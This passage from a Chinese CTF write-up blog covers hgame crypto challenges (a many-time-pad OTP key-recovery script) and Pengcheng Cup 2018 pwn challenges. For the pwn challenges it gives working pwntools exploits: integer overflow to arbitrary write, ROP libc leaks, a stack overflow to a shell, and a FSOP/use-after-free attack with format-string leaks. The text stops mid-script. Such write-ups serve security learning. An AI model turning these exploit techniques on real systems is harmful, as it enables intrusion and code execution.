class="line">&#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;,</span><br><span class="line">&#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;,</span><br><span class="line">&#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;,</span><br><span class="line">&#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;,</span><br><span class="line">&#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;]</span><br><span class="line">&#x27;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div>
<p>大概意思就是声明了一个随机数作为 OTP 的密钥，用同一个密钥将一首诗和 flag 进行加密。<br>google 一圈发现了几道类似的题目，基本思想是 OTP 虽然安全，但是如果一个密钥被用来加密许多明文的话，就面临很大的风险了，有一种攻击叫做 cribdrag，就是专门用来攻击 OTP 类似的密码的。<br>在 github 上面可以找到 cribdrag，但是用在这道题目上并不好使，我找到了另外一个脚本</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span><br><span class="line"># @author intrd - http://dann.com.br/ </span><br><span class="line"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line">import collections</span><br><span class="line">import sets, sys</span><br><span class="line"></span><br><span class="line"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span><br><span class="line">#ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line">ciphers = [&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;,</span><br><span class="line">           &#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;,</span><br><span class="line">           &#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;,</span><br><span class="line">           &#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;,</span><br><span class="line">           &#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;,</span><br><span class="line">           &#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;,</span><br><span class="line">           &#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;,</span><br><span class="line">           &#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;,</span><br><span class="line">           &#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;,</span><br><span class="line">           &#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;,</span><br><span class="line">           &#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;,</span><br><span class="line">           &#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;,</span><br><span class="line">           &#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;,</span><br><span class="line">           &#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;,</span><br><span class="line">           &#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;,</span><br><span class="line">           &#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;]</span><br><span class="line"># The target ciphertext we want to crack</span><br><span class="line">target_cipher = &quot;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&quot;</span><br><span class="line"></span><br><span class="line"># XORs two string</span><br><span class="line">def strxor(a, b):     # xor two strings (trims the longer input)</span><br><span class="line">    return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])</span><br><span class="line"></span><br><span class="line"># To store the final key</span><br><span class="line">final_key = [None]*150</span><br><span class="line"># To store the positions we know are broken</span><br><span class="line">known_key_positions = set()</span><br><span class="line"></span><br><span class="line"># For each ciphertext</span><br><span class="line">for current_index, ciphertext in enumerate(ciphers):</span><br><span class="line">	counter = collections.Counter()</span><br><span class="line">	# for each other ciphertext</span><br><span class="line">	for index, ciphertext2 in enumerate(ciphers):</span><br><span class="line">		if current_index != index: # don&#x27;t xor a ciphertext with itself</span><br><span class="line">			for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): # Xor the two ciphertexts</span><br><span class="line">				# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span><br><span class="line">				if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index</span><br><span class="line">	knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">	# Loop through all positions where a space character was possible in the current_index cipher</span><br><span class="line">	for ind, val in counter.items():</span><br><span class="line">		# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span><br><span class="line">		if val &gt;= 7: knownSpaceIndexes.append(ind)</span><br><span class="line">	#print knownSpaceIndexes # Shows all the positions where we now know the key!</span><br><span class="line"></span><br><span class="line">	# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span><br><span class="line">	xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150)</span><br><span class="line">	for index in knownSpaceIndexes:</span><br><span class="line">		# Store the key&#x27;s value at the correct position</span><br><span class="line">		final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;)</span><br><span class="line">		# Record that we known the key at this position</span><br><span class="line">		known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span><br><span class="line">final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key])</span><br><span class="line"># Xor the currently known key with the target cipher</span><br><span class="line">output = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;))</span><br><span class="line"></span><br><span class="line">print &quot;Fix this sentence:&quot;</span><br><span class="line">print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\n&quot;</span><br><span class="line"></span><br><span class="line"># WAIT.. MANUAL STEP HERE </span><br><span class="line"># This output are printing a * if that character is not known yet</span><br><span class="line"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span><br><span class="line"># if is too hard, change the target_cipher to another one and try again</span><br><span class="line"># and we have our key to fix the entire text!</span><br><span class="line"></span><br><span class="line">#sys.exit(0) #comment and continue if u got a good key</span><br><span class="line"></span><br><span class="line">target_plaintext = &quot;cure, Let Me know if you a&quot;</span><br><span class="line">print &quot;Fixed:&quot;</span><br><span class="line">print target_plaintext+&quot;\n&quot;</span><br><span class="line"></span><br><span class="line">key = strxor(target_cipher.decode(&#x27;hex&#x27;),target_plaintext)</span><br><span class="line"></span><br><span class="line">print &quot;Decrypted msg:&quot;</span><br><span class="line">for cipher in ciphers:</span><br><span class="line">	print strxor(cipher.decode(&#x27;hex&#x27;),key)</span><br><span class="line"></span><br><span class="line">print &quot;\nPrivate key recovered: &quot;+key+&quot;\n&quot;</span><br><span class="line"></span><br><span class="line">print &quot;hgame&#123;OTP_is_not_safe_if_more_than_once&#125;&quot;</span><br></pre></td></tr></table></figure></div>
<p>脚本解出来的 flag 是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*TP_:s_not_safe_if_more_tha&amp;_once</span><br></pre></td></tr></table></figure></div>
<p>把几个字符修复一下</p>
<p>flag: hgame{OTP_is_not_safe_if_more_than_once}</p>
<h2 id="Base全家"><a href="#Base全家" class="headerlink" title="Base全家"></a>Base全家</h2><p>给出一个很大的文件，里面是很多层编码嵌套起来的，推荐到<a class="link"   href="https://gchq.github.io/CyberChef/" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>解密。  </p>
<p>flag: hgame{40ca78cde14458da697066eb4cc7daf6}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>鹏程杯 2018 部分题目复现</title>
    <url>/2019/01/20/pcb2018-online/</url>
    <content><![CDATA[<p>这是一份迟来的 wp，最近一直在忙考试什么的，只能抽时间来复现一下题目。首先要吐槽一下 pcb 的线下比赛，虽然是第一次举办，但是平台也要测试好再上，否则会出现比赛一开始平台就崩了的尴尬情况  ORZ。<br>不过线上赛的题目质量还不错，学到了一些东西。</p>
<span id="more"></span>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="1-OverInt"><a href="#1-OverInt" class="headerlink" title="1. OverInt"></a>1. OverInt</h3><p>pwn 的签到题目，漏洞可以说是摆在脸上了(题目名字也是提示)，一处任意地址写：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-1.png"
                      alt="image"
                ></p>
<p>不过在之前有两步验证需要通过，第一个是类似 hash 的函数，要求返回值是 35，第二个是求和函数，要求输入四个数，并且它们的和要等于 0x20633372，另外，0x20633372 和最开始输入的数之和要小于等于 4。<br>存在一个漏洞，通过整数溢出来绕过验证。  </p>
<p>第一个验证可以爆破出来，然后构造一个整数溢出，让最后的和的二进制最高位变成一，由于是 int 型变量，那么这个数就会被视为负数从而绕过验证。<br>直接上脚本</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level=&quot;DEBUG&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">p = process(&quot;./overInt&quot;)</span><br><span class="line">#p = remote(&quot;58.20.46.148&quot;, 35272)</span><br><span class="line"></span><br><span class="line">def change(offset, content, flag = 0):</span><br><span class="line">    p.send(p32(offset))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[0])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 1)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[1])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 2)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[2])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 3)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[3])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 4)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[4])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 5)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[5])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 6)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[6])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 7)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[7])</span><br><span class="line">    if(flag == 1):</span><br><span class="line">        p.recv(19)</span><br><span class="line">        temp = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">        return temp</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">k1 = chr(2) + chr(224) + chr(157) + chr(95)</span><br><span class="line">p.send(k1)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(5))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(&quot;\x6e\x33\x63\x20&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">pop_ret = 0x0000000000400b13</span><br><span class="line">puts_got = 0x602018</span><br><span class="line">p.send(p32(32))  # len</span><br><span class="line">p.recv()</span><br><span class="line">change(0x38, p64(pop_ret))</span><br><span class="line">change(0x40, p64(puts_got))</span><br><span class="line">change(0x48, p64(0x400550))</span><br><span class="line">puts_addr = change(0x50, p64(0x40087f), 1)</span><br><span class="line">log.info(&quot;puts_addr = 0x%x&quot; % puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[&quot;puts&quot;]</span><br><span class="line">log.success(&quot;libc_addr : 0x%x&quot; % libc_addr)</span><br><span class="line">one_gadget = libc_addr + 0x45216</span><br><span class="line"></span><br><span class="line">k1 = chr(2) + chr(224) + chr(157) + chr(95)</span><br><span class="line">p.send(k1)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(5))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(&quot;\x6e\x33\x63\x20&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(8))</span><br><span class="line">p.recv()</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">change(0x38, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>没有太多需要解释的，唯一一点就是需要注意任意地址写每次只能写一个字节，而且我们需要利用这个漏洞两次，第一次用来泄露地址，第二次触发漏洞。</p>
<h3 id="2-code"><a href="#2-code" class="headerlink" title="2. code"></a>2. code</h3><p>和上一道题类似，需要先过一个 hash 验证，然后就是一个标准的栈溢出，通过爆破 hash 验证，爆破脚本如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">solver = &quot;wabcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line"></span><br><span class="line">it = 0</span><br><span class="line"></span><br><span class="line">for a in solver:</span><br><span class="line">    print(&quot;Solving... %d&quot; % it)</span><br><span class="line">    it += 1</span><br><span class="line">    for b in solver:</span><br><span class="line">        for c in solver:</span><br><span class="line">            for d in solver:</span><br><span class="line">                for e in solver:</span><br><span class="line">                    temp = a + b + c + d + e</span><br><span class="line">                    i = 0</span><br><span class="line">                    v4 = 0</span><br><span class="line">                    for i in range(5):</span><br><span class="line">                        v0 = 117 * v4 + ord(temp[i])</span><br><span class="line">                        v4 = v0 - 0x1D5E0C579E0 * (((((0x8B7978B2C52E2845 * v0) &gt;&gt; 64) + v0) &gt;&gt; 40) - (v0 &gt;&gt; 63)) </span><br><span class="line">                    if v4 == 22493966389:</span><br><span class="line">                        print(&quot;FOUND: %s&quot; % temp)</span><br><span class="line">                        exit()</span><br><span class="line"></span><br><span class="line"># wyBTs</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>最后解出来密码是 wyBTs</p>
<p>接着就可以通过经典的栈溢出来拿 shell 了，需要注意一点，程序中有 seccomp 的保护，直接使用 one_gadget 不行，需要用 system 函数。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level = &quot;DEBUG&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">p = process(&quot;./code&quot;)</span><br><span class="line">p.recvuntil(&quot;name:\n&quot;)</span><br><span class="line">p.sendline(&quot;wyBTs&quot;)</span><br><span class="line">p.recvuntil(&quot;save\n&quot;)</span><br><span class="line">pop_rdi = 0x400983</span><br><span class="line">payload = &#x27;a&#x27; * 0x78 + p64(pop_rdi) + p64(0x601020) + p64(0x400570) + p64(0x400801)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(13)</span><br><span class="line">strlen_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line">libc_addr = strlen_addr - libc.symbols[&quot;strlen&quot;]</span><br><span class="line">log.success(&quot;Libc address : 0x%x&quot; % libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.symbols[&quot;system&quot;]</span><br><span class="line">binsh = libc_addr + 0x18cd57</span><br><span class="line">p.recvuntil(&quot;save\n&quot;)</span><br><span class="line">p.sendline(&quot;a&quot; * 0x78 + p64(pop_rdi) + p64(binsh) + p64(system_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<h3 id="3-random-FSOP-攻击"><a href="#3-random-FSOP-攻击" class="headerlink" title="3. random  (FSOP 攻击)"></a>3. random  (FSOP 攻击)</h3><p>本题的考点是之前学过的 IO_FILE 的利用，不过之前的例子(HCTF 2018 the_end)是直接修改了 vtable 中的函数指针，但是本题需要我们先将 vtable 迁移到可控的内存，然后伪造函数指针，达到利用效果。<br>先用 IDA 看一下程序的代码<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-2.png"
                      alt="image"
                ></p>
<p>重点在函数 sub_D20 ，注册了三个虚函数<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-3.png"
                      alt="image"
                ></p>
<p>也就是说，相当于构建了一个菜单，输入 1 打开 &#x2F;dev&#x2F;urandom 文件<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-4.png"
                      alt="image"
                ></p>
<p>输入 2 会进入到主要逻辑<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-5.png"
                      alt="image"
                ></p>
<p>输入 3 关闭设备文件<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-6.png"
                      alt="image"
                >  </p>
<p>主要漏洞出在第三个函数，我们需要了解一个知识点，那就是 fopen 和 fclose，当调用了 fopen 之后，内核会打开一个磁盘上的文件，然后使用文件指针(就是 FILE* 类型)来标记打开的文件，并且将这个结构体存储在堆上，当调用 fclose 时，内核的关键操作是 free 之前创建在堆上的堆块，清除已经打开的文件指针，但是，本题将 fopen 所创建的堆块地址给了一个全局变量 stream，而在 fclose 之后没有清除这个指针，造成 UAF，我们可以尝试释放 stream 之后修改堆块的内容来劫持 vtable。<br>本题所有保护都开启了，首先要做的是泄露地址，仔细观察，在 compare 函数中有一个格式化字符串漏洞，但是由于使用了 printf_chk，所以并不能拿来修改地址，只能泄露一些地址。<br>一个知识点是，当 scanf 输入较多，会在堆上申请空间并存储输入(当然栈上也有)这就导致了泄露出的地址位置比较奇怪，需要多次测试才能找到合适的地址。<br>我们需要找到三个必要的地址，libc基地址、程序的地址以及堆的地址。  </p>
<p>泄露出地址之后，开始构建漏洞利用环境，将 stream close，接着调用 compare，当 scanf 的时候，就会将刚刚 free 的 FILE 结构体给分配回来，并且可以写入任意的值，在这里我们开始伪造 FILE 结构体，并且将 vtable 迁移到堆上可控内存中，伪造好 vtable 函数指针，当执行 fread 时会出错，程序跑到 _IO_flush_all_lockp，然后调用伪造的函数(one_gadget)，即可拿到 shell。</p>
<p>关于 IO_FILE 的一些分析在前面的文章中说过了，所以直接给出脚本</p>
<p>PS: 借用了 Lilac 战队师傅们的脚本，师傅们把 IO_FILE 的一些结构体封装在了一个类里面，用起来很方便。</p>
<p>IO_FILE 类</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">_IO_USE_OLD_IO_FILE = False</span><br><span class="line">_BITS = 64</span><br><span class="line"> </span><br><span class="line">def _u64(data):</span><br><span class="line">    return struct.unpack(&quot;&lt;Q&quot;,data)[0]</span><br><span class="line"> </span><br><span class="line">def _u32(data):</span><br><span class="line">    return struct.unpack(&quot;&lt;I&quot;,data)[0]</span><br><span class="line"> </span><br><span class="line">def _u16(data):</span><br><span class="line">    return struct.unpack(&quot;&lt;H&quot;,data)[0]</span><br><span class="line"> </span><br><span class="line">def _u8(data):</span><br><span class="line">    return ord(data)</span><br><span class="line"> </span><br><span class="line">def _usz(data):</span><br><span class="line">    if _BITS == 32:</span><br><span class="line">        return _u32(data)</span><br><span class="line">    elif _BITS == 64:</span><br><span class="line">        return _u64(data)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Invalid _BITS&quot;)</span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line">def _ua(data):</span><br><span class="line">    if _BITS == 32:</span><br><span class="line">        return _u32(data)</span><br><span class="line">    elif _BITS == 64:</span><br><span class="line">        return _u64(data)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Invalid _BITS&quot;)</span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line">def _p64(data):</span><br><span class="line">    return struct.pack(&quot;&lt;Q&quot;,data)</span><br><span class="line"> </span><br><span class="line">def _p32(data):</span><br><span class="line">    return struct.pack(&quot;&lt;I&quot;,data)</span><br><span class="line"> </span><br><span class="line">def _p16(data):</span><br><span class="line">    return struct.pack(&quot;&lt;H&quot;,data)</span><br><span class="line"> </span><br><span class="line">def _p8(data):</span><br><span class="line">    return chr(data)</span><br><span class="line"> </span><br><span class="line">def _psz(data):</span><br><span class="line">    if _BITS == 32:</span><br><span class="line">        return _p32(data)</span><br><span class="line">    elif _BITS == 64:</span><br><span class="line">        return _p64(data)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Invalid _BITS&quot;)</span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line">def _pa(data):</span><br><span class="line">    if _BITS == 32:</span><br><span class="line">        return struct.pack(&quot;&lt;I&quot;, data)</span><br><span class="line">    elif _BITS == 64:</span><br><span class="line">        return struct.pack(&quot;&lt;Q&quot;, data)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Invalid _BITS&quot;)</span><br><span class="line">        exit()</span><br><span class="line"> </span><br><span class="line">class _IO_FILE_plus:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self._flags = 0xfbad2887         # High-order word is _IO_MAGIC; rest is flags.</span><br><span class="line">        self._IO_read_ptr = 0   # Current read pointer</span><br><span class="line">        self._IO_read_end = 0   # End of get area</span><br><span class="line">        self._IO_read_base = 0  # Start of putback+get area</span><br><span class="line">        self._IO_write_base = 0 # Start of put area</span><br><span class="line">        self._IO_write_ptr = 0  # Current put pointer</span><br><span class="line">        self._IO_write_end = 0  # End of put area</span><br><span class="line">        self._IO_buf_base = 0   # Start of reserve area</span><br><span class="line">        self._IO_buf_end = 0    # End of reserve area</span><br><span class="line"> </span><br><span class="line">        # The following fields are used to support backing up and undo.</span><br><span class="line">        self._IO_save_base = 0      # Pointer to start of non-current get area</span><br><span class="line">        self._IO_backup_base = 0    # Pointer to first valid character of backup area</span><br><span class="line">        self._IO_save_end = 0       # Pointer to end of non-current get area</span><br><span class="line"> </span><br><span class="line">        self._markers = 0</span><br><span class="line">        self._chain = 0</span><br><span class="line"> </span><br><span class="line">        self._fileno = 0</span><br><span class="line">        self._flags2 = 0</span><br><span class="line">        self._old_offset = 0    # This used to be _offset but it&#x27;s too small</span><br><span class="line"> </span><br><span class="line">        # 1+column number of pbase(); 0 is unknown</span><br><span class="line">        self._cur_column = 0</span><br><span class="line">        self._vtable_offset = 0</span><br><span class="line">        self._shortbuf = 0</span><br><span class="line"> </span><br><span class="line">        self._lock = 0</span><br><span class="line"> </span><br><span class="line">        if not _IO_USE_OLD_IO_FILE:</span><br><span class="line">            self._offset = 0</span><br><span class="line">            self._codecvt = 0</span><br><span class="line">            self._wide_data = 0</span><br><span class="line">            self._freeres_list = 0</span><br><span class="line">            self._freeres_buf = 0</span><br><span class="line">            self.__pad5 = 0</span><br><span class="line">            self._mode = 0</span><br><span class="line">            self._unused2 = [0 for i in range(15 * 4 - 5 * _BITS / 8)]</span><br><span class="line">        self.vtable = 0</span><br><span class="line"> </span><br><span class="line">    def tostr(self):</span><br><span class="line">        buf = _p64(self._flags &amp; 0xffffffff) + \</span><br><span class="line">            _pa(self._IO_read_ptr) + \</span><br><span class="line">            _pa(self._IO_read_end) + \</span><br><span class="line">            _pa(self._IO_read_base) + \</span><br><span class="line">            _pa(self._IO_write_base) + \</span><br><span class="line">            _pa(self._IO_write_ptr) + \</span><br><span class="line">            _pa(self._IO_write_end) + \</span><br><span class="line">            _pa(self._IO_buf_base) + \</span><br><span class="line">            _pa(self._IO_buf_end) + \</span><br><span class="line">            _pa(self._IO_save_base) + \</span><br><span class="line">            _pa(self._IO_backup_base) + \</span><br><span class="line">            _pa(self._IO_save_end) + \</span><br><span class="line">            _pa(self._markers) + \</span><br><span class="line">            _pa(self._chain) + \</span><br><span class="line">            _p32(self._fileno) + \</span><br><span class="line">            _p32(self._flags2) + \</span><br><span class="line">            _p64(self._old_offset) + \</span><br><span class="line">            _p16(self._cur_column) + \</span><br><span class="line">            _p8(self._vtable_offset) + \</span><br><span class="line">            _p8(self._shortbuf)</span><br><span class="line">        if _BITS == 64:</span><br><span class="line">            buf += _p32(0)</span><br><span class="line">        buf += _pa(self._lock)</span><br><span class="line">        if not _IO_USE_OLD_IO_FILE:</span><br><span class="line">            buf += \</span><br><span class="line">            _p64(self._offset) + \</span><br><span class="line">            _pa(self._codecvt) + \</span><br><span class="line">            _pa(self._wide_data) + \</span><br><span class="line">            _pa(self._freeres_list) + \</span><br><span class="line">            _pa(self._freeres_buf) + \</span><br><span class="line">            _psz(self.__pad5) + \</span><br><span class="line">            _p32(self._mode) + \</span><br><span class="line">            &#x27;&#x27;.join(map(lambda x:_p8(x), self._unused2)) +\</span><br><span class="line">            _pa(self.vtable)</span><br><span class="line">        return buf</span><br><span class="line"> </span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.tostr()</span><br></pre></td></tr></table></figure></div>

<p>EXP</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import IO_FILE</span><br><span class="line"></span><br><span class="line"># context(log_level=&quot;DEBUG&quot;)</span><br><span class="line">p = process(&quot;./random&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">#  =======  Build uaf pointer =======</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line"># =======  Leak address =======</span><br><span class="line">payload1 = &quot;%p&quot;*393 + &quot;abcde&quot; + &quot;%p&quot; *12</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&quot;abcde&quot;)</span><br><span class="line">elf_base = int(p.recv(14),16) - 0x2020b0</span><br><span class="line">log.success(&quot;ELF BASE : 0X%x&quot; % elf_base)</span><br><span class="line">payload2 = &quot;%p&quot; * (393 + 12) + &quot;qwert&quot; + &quot;%p&quot;</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(&quot;qwert&quot;)</span><br><span class="line">libc_addr = int(p.recv(14),16) - libc.symbols[&quot;__libc_start_main&quot;] - 240</span><br><span class="line">log.success(&quot;libc_addr : 0x%x&quot; % libc_addr)</span><br><span class="line">one_gadget = libc_addr + 0xf02a4</span><br><span class="line">sleep(0.1)</span><br><span class="line">payload3 =  &quot;%p&quot; * 9 + &quot;%s%s%s&quot; + p64(elf_base + 0x2020a0)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.recvuntil(&quot;next\n&quot;)</span><br><span class="line">p.recv(100)</span><br><span class="line">heap_addr = u64(p.recv(6).ljust(8, &quot;\x00&quot;))</span><br><span class="line">log.success(&quot;heap_addr : 0x%x&quot; % heap_addr)</span><br><span class="line">sleep(0.1)</span><br><span class="line"># ======= 